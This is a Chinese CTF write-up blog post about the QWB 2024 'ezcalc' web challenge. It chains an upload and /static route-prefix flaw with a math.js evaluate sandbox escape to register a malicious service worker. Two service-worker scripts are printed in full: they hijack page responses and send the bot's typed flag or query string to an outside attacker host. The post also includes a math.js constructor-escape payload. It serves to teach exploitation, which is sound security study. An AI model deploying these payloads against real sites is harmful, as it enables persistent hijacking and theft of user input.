<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="app"><a href="#app" class="headerlink" title="app"></a>app</h4><p>只分析关键路由</p>
<h5 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">var err error</span><br><span class="line">db, err = gorm.Open(sqlite.Open(&quot;database.db&quot;), &amp;gorm.Config&#123;&#125;)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">	panic(&quot;failed to connect database&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = db.AutoMigrate(&amp;Screenshot&#123;&#125;, &amp;Report&#123;&#125;)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">	panic(&quot;failed to migrate database&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r := gin.Default()</span><br><span class="line">r.LoadHTMLGlob(&quot;templates/*&quot;)</span><br><span class="line"></span><br><span class="line">r.Use(func(c *gin.Context) &#123;</span><br><span class="line">	host := c.Request.Host</span><br><span class="line">	if host == &quot;&quot; &#123;</span><br><span class="line">		c.JSON(http.StatusBadRequest, &quot;Bad Request&quot;)</span><br><span class="line">		c.Abort()</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	nonce := RandStringRunes(32)</span><br><span class="line">	c.Set(&quot;nonce&quot;, &quot;&quot;)</span><br><span class="line">	c.Header(&quot;Content-Security-Policy&quot;, fmt.Sprintf(&quot;default-src &#x27;none&#x27;; script-src &#x27;self&#x27; &#x27;unsafe-eval&#x27; &#x27;nonce-%s&#x27;; style-src &#x27;unsafe-inline&#x27; &#x27;self&#x27;; img-src &#x27;self&#x27; data: blob:; connect-src &#x27;self&#x27;; frame-src &#x27;none&#x27;; base-uri &#x27;none&#x27;; manifest-src &#x27;none&#x27;; object-src &#x27;none&#x27;;&quot;, nonce))</span><br><span class="line">	c.Header(&quot;X-Content-Type-Options&quot;, &quot;nosniff&quot;)</span><br><span class="line">	c.Header(&quot;X-Frame-Options&quot;, &quot;DENY&quot;)</span><br><span class="line">	c.Header(&quot;Cross-Origin-Opener-Policy&quot;, &quot;same-origin&quot;)</span><br><span class="line">	c.Next()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>连接sqlite，生成nonce，设置CSP头。</p>
<h5 id="static"><a href="#static" class="headerlink" title="&#x2F;static"></a>&#x2F;static</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">r.Use(StaticMiddleware(&quot;/static&quot;, &quot;static&quot;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func StaticMiddleware(relativePath, root string) gin.HandlerFunc &#123;</span><br><span class="line">	return func(c *gin.Context) &#123;</span><br><span class="line">		if strings.HasPrefix(c.Request.URL.Path, relativePath) &#123;</span><br><span class="line">			fs := gin.Dir(root, false)</span><br><span class="line">			fileServer := http.StripPrefix(relativePath, http.FileServer(fs))</span><br><span class="line">			fileServer.ServeHTTP(c.Writer, c.Request)</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			c.Next()</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&#x2F;static处理逻辑是  strings.HasPrefix()来匹配路由是否以&#x2F;static开头，这里存在一个漏洞，后续我们会用到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">访问/static/1.js        正常处理会返回/static/1.js</span><br><span class="line">访问/static1.js 		  同样会返回 /static/1.js</span><br></pre></td></tr></table></figure>

<h5 id="api-screen-upload"><a href="#api-screen-upload" class="headerlink" title="&#x2F;api&#x2F;screen&#x2F;upload"></a>&#x2F;api&#x2F;screen&#x2F;upload</h5><pre><code>r.POST(&quot;/api/screenshot/upload&quot;, func(c *gin.Context) &#123;
    file, err := c.FormFile(&quot;file&quot;)
    if err != nil &#123;
        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Invalid file&quot;&#125;)
        return
    &#125;

    if file.Size &gt; 1*1024*1024 &#123;
        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;File size too large&quot;&#125;)
        return
    &#125;

    dir := filepath.Join(&quot;static&quot;)

    if err := os.MkdirAll(dir, os.ModePerm); err != nil &#123;
        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
        return
    &#125;

    id := uuid.New().String()
    ext := filepath.Ext(file.Filename)

    for _, item := range blacklistedExt &#123;
        if strings.EqualFold(item, ext) &#123;
            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Not allowed to upload this file type&quot;&#125;)
            return
        &#125;
    &#125;

    dst := filepath.Join(dir, id+ext)
    src, err := file.Open()
    if err != nil &#123;
        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
        return
    &#125;
    defer src.Close()
    data, err := io.ReadAll(src)
    if err != nil &#123;
        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
        return
    &#125;

    contentType := http.DetectContentType(data)
    if !strings.HasPrefix(contentType, &quot;image/&quot;) &#123;
        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Invalid file type&quot;&#125;)
        return
    &#125;

    out, err := os.Create(dst)
    if err != nil &#123;
        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
        return
    &#125;
    defer out.Close()

    _, err = io.Copy(out, bytes.NewReader(data))
    if err != nil &#123;
        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
        return
    &#125;

    screenshot := Screenshot&#123;
        ID:   id,
        Path: dst,
    &#125;

    if err := db.Create(&amp;screenshot).Error; err != nil &#123;
        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
        return
    &#125;

    c.JSON(http.StatusOK, gin.H&#123;&quot;status&quot;: &quot;ok&quot;, &quot;data&quot;: screenshot&#125;)
&#125;)
</code></pre>
<p>可上传文件到&#x2F;static目录下，文件名不可控，类型有校验</p>
<h5 id="api-report"><a href="#api-report" class="headerlink" title="&#x2F;api&#x2F;report"></a>&#x2F;api&#x2F;report</h5><pre><code>r.POST(&quot;/api/report&quot;, func(c *gin.Context) &#123;
    var req ReportRequest
    if err := c.BindJSON(&amp;req); err != nil &#123;
        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Invalid request&quot;&#125;)
        return
    &#125;

    report := Report&#123;
        ID:          uuid.New().String(),
        Expression:  req.Expression,
        Result:      req.Result,
        Email:       req.Email,
        Comment:     req.Comment,
        CheckResult: &quot;waiting&quot;,
    &#125;

    for _, id := range req.Screenshots &#123;
        var screenshot Screenshot
        if err := db.Where(&quot;id =?&quot;, id).First(&amp;screenshot).Error; err != nil &#123;
            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Screenshot not found&quot;&#125;)
            return
        &#125;
        if screenshot.ReportID != &quot;&quot; &#123;
            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Screenshot already associated with a report&quot;&#125;)
            return
        &#125;

        screenshot.ReportID = report.ID
        if err := db.Save(&amp;screenshot).Error; err != nil &#123;
            c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
            return
        &#125;
    &#125;

    if err := db.Create(&amp;report).Error; err != nil &#123;
        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
        return
    &#125;

    reportMutex.Lock()
    if reportGoroutineCount &gt;= 32 &#123;
        reportMutex.Unlock()
        c.JSON(http.StatusTooManyRequests, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Too many requests&quot;&#125;)
        return
    &#125;
    reportMutex.Unlock()

    go func() &#123;
        reportMutex.Lock()
        reportGoroutineCount++
        reportMutex.Unlock()
        defer func() &#123;
            reportMutex.Lock()
            reportGoroutineCount--
            reportMutex.Unlock()
        &#125;()

        req, err := http.NewRequest(&quot;GET&quot;, &quot;http://192.168.233.1:52000/api/bot&quot;, nil)
        if err != nil &#123;
            report.CheckResult = &quot;error&quot;
            db.Save(&amp;report)
            return
        &#125;
        q := req.URL.Query()
        q.Add(&quot;expr&quot;, report.Expression)
        req.URL.RawQuery = q.Encode()

        client := &amp;http.Client&#123;&#125;
        resp, err := client.Do(req)
        if err != nil &#123;
            report.CheckResult = &quot;error&quot;
            db.Save(&amp;report)
            return
        &#125;

        defer resp.Body.Close()

        if resp.StatusCode != http.StatusOK &#123;
            report.CheckResult = &quot;error&quot;
            db.Save(&amp;report)
            return
        &#125;

        resBody, err := io.ReadAll(resp.Body)
        if err != nil &#123;
            report.CheckResult = &quot;error&quot;
            db.Save(&amp;report)
            return
        &#125;

        report.CheckResult = string(resBody)
        db.Save(&amp;report)
    &#125;()

    c.JSON(http.StatusOK, gin.H&#123;&quot;status&quot;: &quot;ok&quot;, &quot;data&quot;: gin.H&#123;&quot;id&quot;: report.ID&#125;&#125;)
&#125;)
</code></pre>
<p>发送请求给bot。</p>
<h4 id="bot"><a href="#bot" class="headerlink" title="bot"></a>bot</h4><h5 id="api-bot"><a href="#api-bot" class="headerlink" title="&#x2F;api&#x2F;bot"></a>&#x2F;api&#x2F;bot</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">  let expr = req.query.expr;</span><br><span class="line"></span><br><span class="line">  if (!expr || typeof expr !== &#x27;string&#x27;) &#123;</span><br><span class="line">      res.json(&#123; status: &#x27;error&#x27;, message: &#x27;Missing expr query parameter&#x27; &#125;);</span><br><span class="line">      return;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  try &#123;</span><br><span class="line">      let browser = await puppeteer.launch(&#123;</span><br><span class="line">          executablePath: &#x27;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe&#x27;,</span><br><span class="line">	headless: true,</span><br><span class="line">	args: [</span><br><span class="line">		&quot;--no-sandbox&quot;,</span><br><span class="line">		&quot;--disable-setuid-sandbox&quot;,</span><br><span class="line">              &quot;--disable-crashpad&quot;,</span><br><span class="line">		&quot;--js-flags=--noexpose_wasm,--jitless&quot;</span><br><span class="line">	]</span><br><span class="line">&#125;);</span><br><span class="line">      let page = await browser.newPage();</span><br><span class="line">      await page.goto(`https://192.168.79.129:9000/`, &#123; waitUntil: &#x27;networkidle2&#x27; &#125;);</span><br><span class="line">      await sleep(1000);</span><br><span class="line">      await page.focus(&#x27;input&#x27;);</span><br><span class="line">      await page.keyboard.type(expr);</span><br><span class="line">      await sleep(100);</span><br><span class="line">      await page.click(&#x27;button&#x27;);</span><br><span class="line">      await sleep(2000);</span><br><span class="line">      const result = await page.evaluate(() =&gt; &#123;</span><br><span class="line">          const span = document.querySelector(&#x27;.ant-alert-message&#x27;);</span><br><span class="line">          if (!span) &#123;</span><br><span class="line">              return false;</span><br><span class="line">          &#125;</span><br><span class="line">          return span.textContent === &#x27;114514&#x27;;</span><br><span class="line">      &#125;);</span><br><span class="line">      if (!result) &#123;</span><br><span class="line">          res.json(&#123; status: &#x27;error&#x27;, message: &#x27;Result not found or invalid&#x27; &#125;);</span><br><span class="line">          await page.close();</span><br><span class="line">          await browser.close();</span><br><span class="line">          return;</span><br><span class="line">      &#125;</span><br><span class="line">      if (result) &#123;</span><br><span class="line">          await page.close();</span><br><span class="line">          page = await browser.newPage();</span><br><span class="line">          await page.goto(`https://192.168.79.129:9000/`, &#123; waitUntil: &#x27;networkidle2&#x27; &#125;);</span><br><span class="line">          await sleep(1000);</span><br><span class="line">          await page.focus(&#x27;input&#x27;);</span><br><span class="line">          await page.keyboard.type(`&quot;$&#123;readFileSync(&#x27;/bot/flag&#x27;, &#x27;utf-8&#x27;)&#125;&quot;`, &#123; delay: 100 &#125;);</span><br><span class="line">          await sleep(100);</span><br><span class="line">          await page.click(&#x27;button&#x27;);</span><br><span class="line">          await sleep(1000);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      await page.close();</span><br><span class="line">      await browser.close();</span><br><span class="line">      </span><br><span class="line">      res.json(&#123; status: &#x27;success&#x27; &#125;);</span><br><span class="line">  &#125; catch (error) &#123;</span><br><span class="line">      console.error(`[-] Bot failed to visit: $&#123;error&#125;`);</span><br><span class="line">      res.json(&#123; status: &#x27;error&#x27;, message: &#x27;Bot failed to visit&#x27; &#125;);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>接受来自app的请求，提取req中的expr，作为参数去浏览器模拟访问app calc。如果请求结果是114514，则再开一个请求，将flag输入到expr元素中。</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>怎么劫持bot在expr中的输入？</p>
<p>思路1：控制&#x2F;templates&#x2F;index.tpl   利用上传功能点去覆盖 。但app服务端对上传的文件目录锁在了static且文件名随机了。</p>
<p>没有思路，如果不了解service-worker。</p>
<h3 id="service-worker"><a href="#service-worker" class="headerlink" title="service-worker"></a>service-worker</h3><p>sw 经注册到”浏览器”(存疑) 后，可作为代理中间人拦截修改请求。</p>
<p>浏览器启动时会检测是否支持并注册有SW，若有，则优先加载SW。</p>
<p>chrome:&#x2F;&#x2F;serviceworker-internals&#x2F;</p>
<p>edge:&#x2F;&#x2F;serviceworker-internals&#x2F;</p>
<p>可以看SW名单及所属域</p>
<p>正常页面的注册流程</p>
<p>&#x2F;index</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/26908589/1731025731429-01f70d16-d0a4-423d-8600-66f4cf8b252e.png" alt="img"></p>
<p>&#x2F;index-&gt;&#x2F;js&#x2F;sw-registration.js</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/26908589/1731025822918-46f86494-0cf0-4c6a-9238-16f50d9fa323.png" alt="img"></p>
<p>&#x2F;index-&gt;&#x2F;js&#x2F;sw-registration.js-&gt;&#x2F;sw.js</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/26908589/1731025982655-c07ab80e-563d-48d8-866d-192e124a1f14.png" alt="img"></p>
<p>检测一个网站是否已存在sw模块。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (&#x27;serviceWorker&#x27; in navigator) &#123;</span><br><span class="line">  navigator.serviceWorker.register(&#x27;/sw.js&#x27;).then(function(registration) &#123;</span><br><span class="line">    console.log(&#x27;ServiceWorker registration successful with scope: &#x27;,    registration.scope);</span><br><span class="line">  &#125;).catch(function(err) &#123;</span><br><span class="line">    console.log(&#x27;ServiceWorker registration failed: &#x27;, err);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>service-worker的解析scope</p>
<p>在网页中，如果没有显式地引入 <code>sw.js</code> 文件，浏览器通常不会默认解析它并将其作为 Service Worker 来处理。</p>
<p>Service Worker 的注册是一个明确的操作，一般需要在网页的 JavaScript 代码中通过类似以下方式进行注</p>
<p>测。Service Worker 相关的解析和注册信息主要存储在客户端浏览器中，而不是在服务端。</p>
<p>出于安全考量，Service workers有一些限制：</p>
<ol>
<li>只能注册同源下的js</li>
<li>网站必须是<code>**https://**</code>或者<code>**http://localhost/**</code></li>
<li>content-type 为 *&#x2F;javascript</li>
<li>Worker 线程不能获得下列对象：DOM对象，Windows对象，document对象，parent对象。</li>
</ol>
<p>sw.js注册函数</p>
<p><strong>ServiceWorkerContainer</strong>.register(<strong>scriptURL</strong>, <strong>options</strong>) </p>
<p><strong>navigator</strong>.serviceWorker.register(<strong>scriptURL</strong>, <strong>options</strong>) #返回一个<strong>ServiceWorkerContainer</strong>对象。</p>
<h4 id="浏览器模型-持久化xss基础-先知社区"><a href="#浏览器模型-持久化xss基础-先知社区" class="headerlink" title="浏览器模型 持久化xss基础 - 先知社区"></a>浏览器模型 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8679?time__1311=n4+xnD0DcDu70=eRq05+tOeeiKqD5teqtPQx#toc-1">持久化xss基础 - 先知社区</a></h4><p>多进程(模块)：</p>
<ol>
<li><p>浏览器主进程  主控和调用，创建和销毁其他进</p>
</li>
<li><p>GPU进程 </p>
</li>
<li><p>渲染进程  每个tab 一个进程 下属五个线程：</p>
</li>
<li><p>GUI 线程  复制页面渲染 加载html生成dom树，加载css生成css树，两树拼接后，计算node位置(重排)，渲染node图像(重绘)。与js线程互斥，防止JS执行改变dom而gui不知。</p>
</li>
<li><p>js线程  执行js。v5之前是单线程，为了提高cpu效率，提出多线程。js多线程为主线程开子线程，限制子线程资源。service-worker正是子线程，因此受到限制。</p>
</li>
</ol>
<ul>
<li>DOM对象</li>
<li>window对象的某些属性和方法</li>
<li>documen对象</li>
<li>parent对象</li>
</ul>
<ol>
<li><p>定时触发的线程</p>
</li>
<li><p>异步请求线程</p>
</li>
<li><p>事件触发的线程</p>
</li>
<li><p>插件进程</p>
</li>
</ol>
<h4 id="潜在攻击点1-文件上传劫持sw-js-sw-registration-js"><a href="#潜在攻击点1-文件上传劫持sw-js-sw-registration-js" class="headerlink" title="潜在攻击点1 文件上传劫持sw.js&#x2F;sw-registration.js"></a>潜在攻击点1 文件上传劫持sw.js&#x2F;sw-registration.js</h4><p>升级成存储型XSS获取敏感信息。</p>
<h4 id="攻击点2-Jsonp注册sw"><a href="#攻击点2-Jsonp注册sw" class="headerlink" title="攻击点2 Jsonp注册sw"></a>攻击点2 Jsonp注册sw</h4><p>Jsonp可跨域访问接口。我们可以自己开一个接口，使得调用该接口返回的内容为importScripts(&#x2F;&#x2F;a.com&#x2F;xx.js)</p>
<p>进而注册sw。</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iyiyang/articles/11641904.html">XSS持久化劫持之ServiceWorker - 镱鍚 - 博客园</a>  这篇博客写了具体的操作流程。可以对这篇博客进一步优化，jsonp请求参数设置成 importScripts(&#x2F;&#x2F;a.com&#x2F;xx.js)&#x2F;&#x2F; 来注释返回内容不需要的部分。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://example.com/jsonp.php?callback=test</span><br><span class="line"></span><br><span class="line">HTTP/1.1</span><br><span class="line">200 OK</span><br><span class="line">Content-Type:</span><br><span class="line">text/javascript; charset=UTF-8</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">test(&#123;[...]&#125;)</span><br></pre></td></tr></table></figure>





<p><code>setInterval</code> 方法设置了一个定时器</p>
<h4 id="恶意sw实例"><a href="#恶意sw实例" class="headerlink" title="恶意sw实例"></a>恶意sw实例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(&#x27;install&#x27;,function(event)&#123;</span><br><span class="line">  // Skip waiting so the SW activates immediately on install</span><br><span class="line">    self.skipWaiting();</span><br><span class="line">    console.log(&#x27;install ok!&#x27;);</span><br><span class="line">&#125;)</span><br><span class="line">self.addEventListener(&#x27;activate&#x27;, event =&gt; &#123;</span><br><span class="line">  // Activate immediately after installation</span><br><span class="line">    event.waitUntil(self.clients.claim());</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">self.addEventListener(&#x27;fetch&#x27;,function(event)&#123;</span><br><span class="line">    console.log(event.request);</span><br><span class="line">    event.respondWith(</span><br><span class="line">    caches.match(event.request).then(function(res)&#123;</span><br><span class="line">        return new Response(&#x27;&lt;script&gt;location=&quot;http://IP?&quot;+btoa(location.search)&lt;/script&gt;&#x27;, &#123;headers: &#123; &#x27;Content-Type&#x27;: &#x27;text/html&#x27; &#125;&#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    )</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<h3 id="qwb-ezcalc-注入sw"><a href="#qwb-ezcalc-注入sw" class="headerlink" title="qwb ezcalc 注入sw"></a>qwb ezcalc 注入sw</h3><p>有文件上传点，且利用&#x2F;static解析中间件的解析漏洞， navigator.serviceWorker.register(‘&#x2F;staticsw.js’)可以让我们控制sw的scope为整个根域，进而劫持bot对app的访问及flag的输入。</p>
<p>问题是，我们怎么显示的去让bot调用navigator.serviceWorker.register。</p>
<p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/85/#EzCalc">强网杯 2024 By W&amp;M - W&amp;M Team</a></p>
<p>math.js version 11.8.2 存在rce</p>
<p>我们在页面中输入的执行的expr ，同样会被bot执行一遍。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// could execute a nodejs script like &quot;return process.mainModule.require(child_process).execSync(whoami)&quot;</span><br><span class="line">const result = math.evaluate(&#x27;evalFunctionNode=parse(&quot;constructor(\&#x27;return process.version\&#x27;)&quot;)._compile(&#123;&#125;,&#123;&#125;);&#x27; +</span><br><span class="line">  &#x27;f=evalFunctionNode(null,cos);&#x27; +</span><br><span class="line">  &#x27;f()&#x27;)</span><br></pre></td></tr></table></figure>

<p>有一个小问题，原payload里面的evalFunctionNode 在页面引入的js中被压缩成了e</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e=<span class="title function_">parse</span>(<span class="string">&quot;constructor(&#x27;d=()=&gt;document.querySelector(`.ant-alert-message`);setInterval(()=&gt;&#123;if(d())d().innerHTML=114514&#125;,100);alert(1)&#x27;)&quot;</span>).<span class="title function_">_compile</span>(&#123;&#125;,&#123;&#125;);f=<span class="title function_">e</span>(<span class="literal">null</span>,cos);<span class="title function_">f</span>()</span><br></pre></td></tr></table></figure>

<p>成功劫持。</p>
<p>W&amp;M的wp里sw.js</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;installedstart&quot;);</span><br><span class="line">self.addEventListener(&#x27;install&#x27;, event =&gt; &#123;</span><br><span class="line">  // Skip waiting so the SW activates immediately on install</span><br><span class="line">  self.skipWaiting();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">self.addEventListener(&#x27;activate&#x27;, event =&gt; &#123;</span><br><span class="line">  // Activate immediately after installation</span><br><span class="line">  event.waitUntil(self.clients.claim());</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">const html = `</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;input id=&quot;expr&quot; placeholder=&quot;Math Expression&quot; class=&quot;ant-input css-ni1kz0 ant-input-outlined ant-input-compact-item ant-input-compact-first-item&quot; type=&quot;text&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;button id=&quot;calc&quot; type=&quot;button&quot; class=&quot;ant-btn css-ni1kz0 ant-btn-primary ant-btn-color-primary ant-btn-variant-solid ant-btn-compact-item ant-btn-compact-last-item&quot;&gt;&lt;span&gt;Calculate&lt;/span&gt;&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">calc.onclick = function()&#123;</span><br><span class="line">window.location.href = &quot;http://123.45.67.89:9990/flag?flag=&quot;+encodeURI(expr.value)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">`;</span><br><span class="line"></span><br><span class="line">self.addEventListener(&#x27;fetch&#x27;, event =&gt; &#123;</span><br><span class="line">console.log(event);</span><br><span class="line">  // Intercept the request for /index.html</span><br><span class="line">  if (event.request.url.endsWith(&#x27;/&#x27;)) &#123;</span><br><span class="line">    event.respondWith(</span><br><span class="line">      new Response(html, &#123;</span><br><span class="line">        headers: &#123; &#x27;Content-Type&#x27;: &#x27;text/html&#x27; &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>添加了一些操作，例如skipWaiting ， event.waitUntil(self.clients.claim())。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/09/windows%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Charger0">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Charger0">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
